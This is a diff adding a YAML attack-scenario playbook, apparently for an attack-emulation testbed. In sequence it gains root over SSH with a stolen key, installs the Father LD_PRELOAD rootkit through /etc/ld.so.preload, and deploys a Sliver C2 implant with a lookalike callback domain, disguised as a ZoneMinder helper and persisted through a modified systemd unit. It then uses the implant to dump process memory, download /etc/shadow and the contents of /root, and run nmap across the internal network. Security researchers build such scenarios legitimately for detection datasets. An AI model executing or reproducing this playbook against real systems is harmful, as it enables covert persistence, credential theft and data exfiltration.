@@ -1,0 +1,242 @@
+####################
+#
+# Scenario 2 a c
+#
+####################
+
+vars:
+  $SERVER_ADDRESS: 192.42.0.254
+  $ATTACKER_ADDRESS: 192.42.1.174
+  $DNS_SERVER: 192.42.0.233
+  $DOMAIN: aecid-testbed.com
+  $USER: aecid
+  $SSH_KEY: "{{user_home.stdout}}/.ssh/privesc_key_videoserver"
+  $IMPLANTPATH: /tmp/superimplant
+  NETWORK: "172.17.100.0/24"
+  FATHER_INSTALLPATH: "/usr/lib/selinux.so.3"
+  FATHER_CHROOTFILE: "/home/aecid/glibc_rootjail.tar.xz"
+
+commands:
+  - type: ssh
+    cmd: id
+    hostname: $SERVER_ADDRESS
+    port: 2222
+    username: root
+    key_filename: $SSH_KEY
+    creates_session: "root"
+
+  - type: mktemp
+    cmd: dir
+    variable: FATHERCHROOT
+
+  - type: shell
+    cmd: sudo tar -C $FATHERCHROOT -xvJf $FATHER_CHROOTFILE
+
+  - type: father
+    cmd: generate
+    env_var: "AECID"
+    file_prefix: "hiyw"
+    # group: fax
+    gid: 21
+    shell_pass: "haveityourway"
+    install_path: $FATHER_INSTALLPATH
+    local_path: $FATHERCHROOT/rootjail/tmp
+    build_command: sudo chroot $FATHERCHROOT/rootjail /bin/bash -c "cd /tmp/Father && make"
+
+  - type: sftp
+    cmd: put
+    local_path: $LAST_FATHER_PATH
+    remote_path: $FATHER_INSTALLPATH
+    mode: "0644"
+    session: root
+
+  - type: shell
+    cmd: sudo rm -rf $FATHERCHROOT/rootjail
+
+  - type: sliver
+    cmd: "generate_implant"
+    c2url: "https://faaacebook.com"
+    name: "superimplant"
+    filepath: $IMPLANTPATH
+
+  - type: sliver
+    cmd: start_https_listener
+    host: 0.0.0.0
+    port: 443
+
+  - type: shell
+    cmd: ls $IMPLANTPATH
+
+  - type: sftp
+    cmd: put
+    local_path: "$IMPLANTPATH"
+    remote_path: /usr/bin/zmcontroller
+    mode: 755
+    session: "root"
+   
+
+  - type: ssh
+    cmd: "vim /etc/systemd/system/multi-user.target.wants/zoneminder.service\n"
+    interactive: True
+    session: "root"
+
+  - type: ssh
+    cmd: ":inoremap jj <ESC>\n"
+    interactive: True
+    session: "root"
+
+  - type: ssh
+    interactive: True
+    cmd: "/[Service\n"
+    session: "root"
+
+  - type: ssh
+    cmd: "o"
+    interactive: True
+    session: "root"
+
+  - type: ssh
+    cmd: ExecStartPre=sudo -g fax bash -c "/usr/bin/zmcontroller &"
+    interactive: True
+    session: "root"
+
+  - type: ssh
+    cmd: "jj"
+    interactive: True
+    session: "root"
+
+  - type: ssh
+    cmd: ":wq!\n"
+    interactive: True
+    session: "root"
+
+  - type: ssh
+    cmd: "echo /usr/lib/selinux.so.3 >> /etc/ld.so.preload"
+    session: root
+
+  - type: ssh
+    cmd: systemctl daemon-reload
+    session: root
+
+  - type: ssh
+    cmd: systemctl restart zoneminder.service
+    session: root
+
+  - type: sliver-session
+    cmd: ls
+    remote_path: "."
+    session: superimplant
+
+  - type: sliver-session
+    cmd: ps
+    session: superimplant
+
+  - type: regex
+    cmd: (\d+) .*mariadb
+    output:
+      PROCESS: "$MATCH_0"
+
+  - type: debug
+    cmd: "$PROCESS"
+
+  - type: mktemp
+    variable: TEMPPROCDUMP
+
+  - type: sliver-session
+    cmd: process_dump
+    pid: 1
+    session: superimplant
+    local_path: $TEMPPROCDUMP
+
+  - type: sliver-session
+    cmd: netstat
+    session: superimplant
+
+  - type: sliver-session
+    cmd: ifconfig
+    session: superimplant
+
+  - type: mktemp
+    variable: SHADOW
+
+  - type: sliver-session
+    cmd: download
+    remote_path: /etc/shadow
+    local_path: $SHADOW
+    session: superimplant
+
+  - type: sliver-session
+    cmd: execute
+    exe: /usr/bin/tar
+    args:
+      - cvzf
+      - /tmp/r.tar.gz
+      - /root
+    session: superimplant
+
+  - type: mktemp
+    variable: ROOTTAR
+
+  - type: mktemp
+    variable: ROOTTAR2
+
+  - type: sliver-session
+    cmd: download
+    remote_path: /tmp/r.tar.gz
+    local_path: $ROOTTAR
+    session: superimplant
+
+  - type: sliver-session
+    cmd: rm
+    remote_path: /tmp/r.tar.gz
+    session: superimplant
+
+  - type: sliver-session
+    cmd: download
+    remote_path: /root
+    local_path: $ROOTTAR2
+    recurse: True
+    session: superimplant
+
+  - type: sliver-session
+    cmd: execute
+    exe: cat
+    args:
+      - /etc/pam.d/common-password
+    session: superimplant
+
+  - type: sliver-session
+    cmd: execute
+    exe: cat
+    args:
+      - /etc/passwd
+    session: superimplant
+
+  - type: sliver-session
+    cmd: execute
+    exe: chage
+    args:
+      - -l
+      - $USER
+    session: superimplant
+
+  - type: sliver-session
+    cmd: upload
+    local_path: /var/www/html/nmap
+    remote_path: /tmp/nmap
+    session: superimplant
+
+  - type: sliver-session
+    cmd: execute
+    exe: chmod
+    args:
+      - 755
+      - /tmp/nmap
+    session: superimplant
+
+  - type: sliver-session
+    cmd: execute
+    exe: /tmp/nmap
+    args:
+      - 172.17.100.0/24
+    session: superimplant
